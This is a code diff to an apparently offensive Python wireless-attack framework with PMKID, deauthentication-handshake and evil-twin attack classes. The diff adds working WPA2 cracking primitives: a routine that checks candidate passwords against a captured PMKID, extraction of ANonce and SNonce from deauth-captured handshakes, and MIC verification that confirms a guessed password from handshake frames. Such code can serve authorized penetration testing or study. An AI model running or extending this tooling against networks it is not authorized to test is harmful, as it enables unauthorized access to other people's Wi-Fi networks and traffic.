@@ -23,6 +23,7 @@ from __future__ import annotations
 
 import asyncio
 import hashlib
+import hmac
 import logging
 import os
 import struct
@@ -38,6 +39,20 @@ logger = logging.getLogger(__name__)
 
 # Output directory for captures
 CAPTURE_DIR = Path("captures")
+
+# WPA2 integration - guarded imports for key derivation and verification
+try:
+    from posframework.wpa2 import (
+        derive_pmk as _wpa2_derive_pmk,
+        derive_ptk as _wpa2_derive_ptk,
+        extract_key_hierarchy as _wpa2_extract_key_hierarchy,
+        verify_eapol_mic as _wpa2_verify_eapol_mic,
+        EAPOLKeyFrame as _WPA2EAPOLKeyFrame,
+        CipherSuite as _WPA2CipherSuite,
+    )
+    _HAS_WPA2 = True
+except ImportError:
+    _HAS_WPA2 = False
 
 
 class AttackType(Enum):
@@ -416,6 +431,55 @@ class PMKIDAttack(Attack):
 
         return None
 
+    def verify_pmkid_candidate(
+        self,
+        pmkid_hex: str,
+        ap_mac: str,
+        sta_mac: str,
+        ssid: str,
+        password: str,
+    ) -> bool:
+        """
+        Verify a PMKID candidate against a password.
+
+        Derives PMK from password/SSID, computes expected PMKID using
+        HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || STA_MAC), and compares
+        with the provided pmkid_hex.
+
+        Args:
+            pmkid_hex: Captured PMKID as hex string (32 hex chars / 16 bytes)
+            ap_mac: AP MAC address (colon-separated, e.g. "aa:bb:cc:dd:ee:ff")
+            sta_mac: Station MAC address (colon-separated)
+            ssid: Network SSID
+            password: Candidate password to test
+
+        Returns:
+            True if the password produces a matching PMKID.
+        """
+        if not _HAS_WPA2:
+            logger.error("wpa2 module not available for PMKID verification")
+            return False
+
+        try:
+            # Derive PMK from password and SSID
+            pmk = _wpa2_derive_pmk(password, ssid)
+
+            # Convert MAC addresses from colon-separated hex to bytes
+            ap_mac_bytes = bytes.fromhex(ap_mac.replace(":", "").replace("-", ""))
+            sta_mac_bytes = bytes.fromhex(sta_mac.replace(":", "").replace("-", ""))
+
+            # Compute PMKID = HMAC-SHA1-128(PMK, "PMK Name" || MAC_AP || MAC_STA)
+            data = b"PMK Name" + ap_mac_bytes + sta_mac_bytes
+            computed_pmkid = hmac.new(pmk, data, hashlib.sha1).digest()[:16]
+
+            # Compare with captured PMKID
+            captured_pmkid = bytes.fromhex(pmkid_hex)
+            return hmac.compare_digest(computed_pmkid, captured_pmkid)
+
+        except Exception as e:
+            logger.error("PMKID verification error: %s", e)
+            return False
+
 
 class DeauthHandshakeAttack(Attack):
     """
@@ -708,12 +772,36 @@ class DeauthHandshakeAttack(Attack):
                     key=lambda c: len(eapol_frames[c]),
                 )
 
-                return {
+                # Extract ANonce and SNonce from EAPOL frames using wpa2 module
+                anonce = None
+                snonce = None
+                if _HAS_WPA2:
+                    for pkt in captured_packets:
+                        try:
+                            eapol_raw = raw(pkt[EAPOL])
+                            parsed = _WPA2EAPOLKeyFrame.parse(eapol_raw)
+                            if parsed and parsed.nonce != b'\x00' * 32:
+                                # Msg1 (from AP): has ACK, no MIC
+                                if parsed.has_ack and not parsed.has_mic:
+                                    anonce = parsed.nonce
+                                # Msg2 (from STA): has MIC, no ACK
+                                elif parsed.has_mic and not parsed.has_ack:
+                                    snonce = parsed.nonce
+                        except Exception:
+                            continue
+
+                result_dict = {
                     "file": filename,
                     "frame_count": len(captured_packets),
                     "client_mac": best_client,
                     "clients_captured": list(eapol_frames.keys()),
                 }
+                if anonce:
+                    result_dict["anonce"] = anonce.hex()
+                if snonce:
+                    result_dict["snonce"] = snonce.hex()
+
+                return result_dict
 
             return None
 
@@ -723,6 +811,82 @@ class DeauthHandshakeAttack(Attack):
         except Exception as e:
             logger.error("Deauth scapy error: %s", e)
             return None
+
+    def validate_handshake(
+        self,
+        captured_packets: List[bytes],
+        bssid: str,
+        sta_mac: str,
+        password: str,
+        ssid: str,
+    ) -> bool:
+        """
+        Validate a captured WPA2 handshake by verifying the MIC on Msg2.
+
+        Derives PMK from password/SSID, extracts ANonce from Msg1 and SNonce
+        from Msg2, derives PTK, then verifies the MIC on Msg2.
+
+        Args:
+            captured_packets: List of raw EAPOL frame bytes (at least Msg1 + Msg2)
+            bssid: AP BSSID (colon-separated hex)
+            sta_mac: Station MAC address (colon-separated hex)
+            password: Candidate password to test
+            ssid: Network SSID
+
+        Returns:
+            True if the password is correct (MIC verification passes).
+        """
+        if not _HAS_WPA2:
+            logger.error("wpa2 module not available for handshake validation")
+            return False
+
+        try:
+            # Parse all EAPOL frames to find Msg1 (ANonce) and Msg2 (SNonce + MIC)
+            msg1_frame = None
+            msg2_frame = None
+
+            for pkt_data in captured_packets:
+                parsed = _WPA2EAPOLKeyFrame.parse(pkt_data)
+                if parsed is None:
+                    continue
+                if parsed.nonce == b'\x00' * 32:
+                    continue
+                # Msg1: has ACK, no MIC (AP sends ANonce)
+                if parsed.has_ack and not parsed.has_mic:
+                    msg1_frame = parsed
+                # Msg2: has MIC, no ACK (STA sends SNonce + MIC)
+                elif parsed.has_mic and not parsed.has_ack and parsed.is_pairwise:
+                    msg2_frame = parsed
+
+            if msg1_frame is None or msg2_frame is None:
+                logger.warning("Incomplete handshake: need both Msg1 and Msg2")
+                return False
+
+            anonce = msg1_frame.nonce
+            snonce = msg2_frame.nonce
+
+            # Derive PMK from password and SSID
+            pmk = _wpa2_derive_pmk(password, ssid)
+
+            # Convert MAC addresses to bytes
+            ap_mac_bytes = bytes.fromhex(bssid.replace(":", "").replace("-", ""))
+            sta_mac_bytes = bytes.fromhex(sta_mac.replace(":", "").replace("-", ""))
+
+            # Derive PTK
+            ptk = _wpa2_derive_ptk(
+                pmk, ap_mac_bytes, sta_mac_bytes, anonce, snonce,
+                _WPA2CipherSuite.CCMP,
+            )
+
+            # Extract KCK from PTK
+            keys = _wpa2_extract_key_hierarchy(ptk, _WPA2CipherSuite.CCMP)
+
+            # Verify MIC on Msg2
+            return _wpa2_verify_eapol_mic(keys.kck, msg2_frame)
+
+        except Exception as e:
+            logger.error("Handshake validation error: %s", e)
+            return False
 
 
 class EvilTwinAttack(Attack):
